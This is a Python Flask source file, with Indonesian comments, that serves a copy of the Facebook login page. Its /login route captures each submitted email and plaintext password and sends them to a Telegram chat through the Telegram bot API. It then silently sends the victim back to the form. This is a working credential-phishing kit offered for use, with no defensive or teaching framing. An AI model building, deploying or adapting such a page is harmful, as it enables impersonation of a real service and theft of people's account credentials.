from flask import Flask, render_template_string, request, redirect, url_for
import sqlite3
from werkzeug.security import generate_password_hash
import requests
import os
from datetime import datetime
from dotenv import load_dotenv

# ==============================
# Load environment variables
# ==============================
load_dotenv()

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
CHAT_ID   = os.environ.get("TELEGRAM_CHAT_ID", "")
DB_PATH   = "users.db"

app = Flask(__name__)

# ==============================
# Database setup
# ==============================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            provider TEXT,
            email TEXT,
            name TEXT,
            hashed_password TEXT,
            extra_data TEXT,
            created_at TEXT
        );
    """)
    conn.commit()
    conn.close()

# ==============================
# Helper functions
# ==============================
def save_user(provider, email=None, name=None, hashed_password=None, extra_data=None):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("""
        INSERT INTO users (provider, email, name, hashed_password, extra_data, created_at)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (provider, email, name, hashed_password, extra_data, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()

def send_to_telegram(message_text):
    if not BOT_TOKEN or not CHAT_ID:
        print("⚠️ Telegram token/chat_id belum diatur.")
        return False

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message_text, "parse_mode": "HTML"}
    try:
        r = requests.post(url, data=payload, timeout=10)
        if r.ok:
            print("✅ Pesan berhasil dikirim ke Telegram.")
        else:
            print("❌ Gagal kirim ke Telegram:", r.text)
        return r.ok
    except Exception as e:
        print("❌ Error kirim Telegram:", e)
        return False

# ==============================
# HTML Template (tanpa pesan flash)
# ==============================
facebook_template = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Login ke Facebook</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, Helvetica, sans-serif; }
        section {
            position: relative;
            justify-content: center;
            align-items: center;
            width: 100%;
            display: flex;
            min-height: 100vh;
            background-color: #f0f2f5;
        }
        section .main .facebook {
            margin: -40px 0 -2px 0;
            width: 240px;
        }
        section .main {
            width: 500px;
            align-items: center;
            justify-content: center;
            display: flex;
            flex-direction: column;
            margin-bottom: 40px;
        }
        section .main .box {
            position: relative;
            border: 1px solid #dddfe2;
            box-shadow: 4px 8px 16px rgb(0, 0, 0, 0.1), 4px 8px 16px rgb(0, 0, 0, 0.1);
            border-radius: 8px;
            padding: 0 0 14px 0;
            justify-content: center;
            align-items: center;
            width: 396px;
            text-align: center;
            background-color: #fff;
        }
        section .main .box .login-text {
            padding: 20px;
            font-size: 18px;
            padding-top: 24px;
            padding-bottom: 16px;
        }
        section .main .box input {
            width: 330px;
            height: 22px;
            padding: 14px 16px;
            margin: 0 15px 15px 15px;
            border-radius: 6px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            background-color: #FFFFFF;
            outline: none;
        }
        section .main .box .login {
            width: 364px;
            height: 48px;
            padding: 0 16px;
            margin: 0 15px 15px 15px;
            border: none;
            border-radius: 6px;
            background-color: #1877f2;
            font-size: 20px;
            font-weight: bold;
            color: #fff;
            cursor: pointer;
        }
        section .main .box div a {
            font-size: 14px;
            text-decoration: none;
            color: #1877f2;
            font-weight: 500;
        }
        section .main .box .or {
            font-size: 12px;
            margin: 12px;
            color: #96999e;
        }
        section .main .box .newAcc {
            width: 195px;
            line-height: 48px;
            padding: 0 16px;
            font-size: 17px;
            font-weight: bold;
            border-radius: 6px;
            border: none;
            background-color: #42b72a;
            color: #fff;
            margin: 0 15px 12px 15px;
            cursor: pointer;
        }
        ::placeholder { color: #929395; }
        section .main .box .login:hover { background-color: #106fea; }
        section .main .box .newAcc:hover { background-color: #30ad17; }
        section .main .box div a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <section>
        <div class="main">
            <img src="https://github.com/Supriyo2810/Facebook-Login/blob/main/facebook.png?raw=true" alt="Facebook" class="facebook" />
            <div class="box">
                <div class="login-text">Log in to Facebook</div>
                <form method="POST" action="/login">
                    <input type="text" name="email" placeholder="Email atau Nomor Telepon" required />
                    <input type="password" name="password" placeholder="Kata Sandi" required />
                    <button type="submit" class="login">Login</button>
                </form>
                <div><a href="#">Lupa Akun?</a></div>
                <div class="or">atau</div>
                <form method="GET" action="/register">
                    <button class="newAcc">Buat Akun Baru</button>
                </form>
            </div>
        </div>
    </section>
</body>
</html>
"""

# ==============================
# Routes
# ==============================
@app.route("/")
def index():
    return render_template_string(facebook_template)

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "").strip()
    password = request.form.get("password")

    if not email or not password:
        return redirect(url_for("index"))

    hashed = generate_password_hash(password)
    save_user("local-login", email=email, hashed_password=hashed, extra_data="login")

    msg = f"""🔐 Login user:
Email: {email}
Password: {password}
Waktu (UTC): {datetime.utcnow().isoformat()}"""
    send_to_telegram(msg)

    # Tidak menampilkan pesan, tetap di halaman login
    return redirect(url_for("index"))

@app.route("/register", methods=["GET", "POST"])
def register():
    return "<h2>Halaman Registrasi</h2><p>Masih dalam pengembangan.</p>"

# ==============================
# Main
# ==============================
if __name__ == "__main__":
    init_db()
    print("🚀 Flask app berjalan di http://localhost:5000")
    app.run(debug=True, host="0.0.0.0", port=5000)
